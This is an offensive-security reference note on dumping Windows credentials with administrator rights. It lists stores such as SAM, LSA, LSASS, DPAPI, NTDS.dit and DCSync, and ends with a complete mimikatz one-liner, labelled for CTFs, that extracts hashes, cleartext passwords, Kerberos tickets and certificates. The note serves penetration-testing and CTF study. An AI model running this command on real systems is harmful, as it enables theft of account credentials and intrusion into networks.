---
title: Privileged Windows Credential Access
---

[[notes/mitre-attack/credential-access|Access credentials]] with admin privileges on [[notes/windows/index]].

Overview:

- cached [[notes/windows/kerberos-dump|Kerberos Tickets]] of recent logins
- NT hashes of local users in [[notes/windows/registry-dump|SAM]]
- NT hashes and clear text passwords of service accounts as well domain cached credentials in [[notes/windows/registry-dump|LSA]]
- NT hashes of recent logins in [[notes/windows/lsass-dump|LSASS]] process memory
- clear text passwords of explicitly provided credentials in [[notes/windows/lsass-dump|LSASS]] process memory ([source](http://web.archive.org/web/20231201003112/https://blog.gentilkiwi.com/securite/mimikatz/sekurlsa-ssp-ntlm))
- clear text passwords stored in Credential Manager or Windows Vault and other secrets protected by [[notes/windows/dpapi-dump|DPAPI]]
- machine [[notes/windows/certificate-theft|certificates]]
- clear text passwords from [[notes/windows/rdp-dump|RDP client and server processes]] or [[notes/windows/rdp-session-takeover|RDP session takeover]]
- clear text passwords cached in [[notes/windows/wdigest-dump|WDigest]] on legacy systems
- NT hashes of domain accounts in [[notes/ad/ntds-dump|NTDS.dit]] on DC
- NT hashes of domain accounts via [[notes/ad/dcsync|DCSync]] from DC
- everything from [[notes/windows/credential-access-user]]

All in one command for CTFs.

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe token::elevate privilege::debug lsadump::sam lsadump::secrets lsadump::cache "lsadump::lsa /patch" sekurlsa::wdigest "sekurlsa::logonpasswords full" sekurlsa::ekeys sekurlsa::kerberos sekurlsa::tickets "vault::cred /patch" "crypto::certificates /export" "crypto::certificates /systemstore:local_machine /export" exit
    ~~~

    If you are desperate add `ts::logonpasswords ts::mstsc`.
